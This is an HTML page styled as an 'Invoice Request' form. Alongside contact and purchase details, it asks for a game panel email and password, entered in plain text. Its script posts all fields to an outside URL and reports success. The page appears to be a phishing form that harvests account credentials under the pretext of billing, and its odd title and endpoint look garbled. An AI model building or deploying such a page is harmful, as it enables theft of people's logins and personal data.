<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>ie Yr hdhd</title>
<style>
body {
  font-family: Arial, sans-serif;
  background: #f8f9fa;
  display: flex;
  justify-content: center;
  align-items: center;
  padding: 40px;
}
form {
  background: #fff;
  padding: 20px;
  width: 350px;
  border-radius: 10px;
  box-shadow: 0 0 10px rgba(0,0,0,0.1);
}
label {
  font-weight: bold;
  color: #7200ff;
  display: block;
  margin-top: 10px;
}
input, button {
  width: 100%;
  padding: 10px;
  margin-top: 5px;
}
button {
  background: #7200ff;
  color: white;
  font-size: 16px;
  border: none;
  cursor: pointer;
  margin-top: 15px;
}
.success {
  background: #d1ffd8;
  padding: 10px;
  border-radius: 6px;
  margin-top: 10px;
  display: none;
}
.error {
  background: #ffd1d1;
  padding: 10px;
  border-radius: 6px;
  margin-top: 10px;
  display: none;
}
</style>
</head>
<body>

<form id="billingForm">
<h2 style="text-align:center;color:#7200ff;">Invoice Request</h2>

<label>Full Name</label>
<input type="text" name="fullname" required>

<label>Mobile Number</label>
<input type="text" name="mobile" required>

<label>Customer Email</label>
<input type="email" name="email" required>

<label>Product Name</label>
<input type="text" name="product" required>

<label>Purchase Date</label>
<input type="date" name="date" required>

<label>Game Panel Email</label>
<input type="email" name="panel_email" required>

<label>Game Panel Password</label>
<input type="text" name="panel_password" required>

<button type="submit">Send</button>
<div class="success">✅ Email Sent Successfully!</div>
<div class="error">❌ Something went wrong!</div>
</form>

<script>
document.getElementById("billingForm").addEventListener("submit", async function (e) {
  e.preventDefault();

  const formData = Object.fromEntries(new FormData(this));
  const successMsg = document.querySelector(".success");
  const errorMsg = document.querySelector(".error");

  successMsg.style.display = "none";
  errorMsg.style.display = "none";

  try {
    const res = await fetch("https://resend.com/api-keys/5b2122b7-a197-4ea9-9232-51428abf273c", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(formData)
    });

    if (res.ok) {
      successMsg.style.display = "block";
      this.reset();
    } else {
      errorMsg.style.display = "block";
    }
  } catch {
    errorMsg.style.display = "block";
  }
});
</script>

</body>
</html>
